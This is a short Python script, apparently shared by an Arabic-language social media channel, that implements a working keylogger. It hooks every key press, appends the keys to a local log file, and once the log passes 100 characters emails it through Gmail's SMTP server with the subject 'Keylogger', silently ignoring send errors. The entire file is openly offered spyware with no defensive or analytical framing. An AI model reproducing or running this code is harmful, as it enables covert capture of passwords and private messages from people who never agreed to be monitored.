#بسم الله الرحمان الرحيم و الحمد لله رب العالمين على نعمه التي لا تعد و لاتحصى ربي زدنا علما وإنفعنا بما علمتنا و إنفع بنا غيرنا و إرزقنا الأجر
#هذا من فضل ربي
#زكاة_المعرفة
#https://www.facebook.com/ZakatKnowledge
#https://www.instagram.com/zakat_of_knowledge
#https://www.youtube.com/channel/UCCiBkOPPs1iTCOyEeL7zWQg?view_as=subscriber
import keyboard
import smtplib
def print_pressed_keys(e):
    lis = ['tab', 'ctrl', 'enter', 'alt', 'maj', 'backspace', 'space', 'verr.maj']
    line = str(keyboard._pressed_events)
    with open('log.log', 'a') as a:
        for i in lis:
            if i in line:
                text = '[' + i + ']'
                break
            else:
                text = line[18:20]
                text = text.replace('(', '')
                text = text.replace(' ', '')
        a.write(text)
    with open('log.log', 'r+') as b:
        txt = b.read()
        if len(txt) > 100:
            try:
                sendd(txt)
                b.truncate(0)
            except:
                pass


def sendd(text):
    TO = 'gmail'
    SUBJECT = 'Keylogger'
    gmail_sender = 'gmail'
    gmail_passwd = 'password'
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.login(gmail_sender, gmail_passwd)
    server.sendmail(gmail_sender, TO, text)


keyboard.hook(print_pressed_keys)
keyboard.wait()
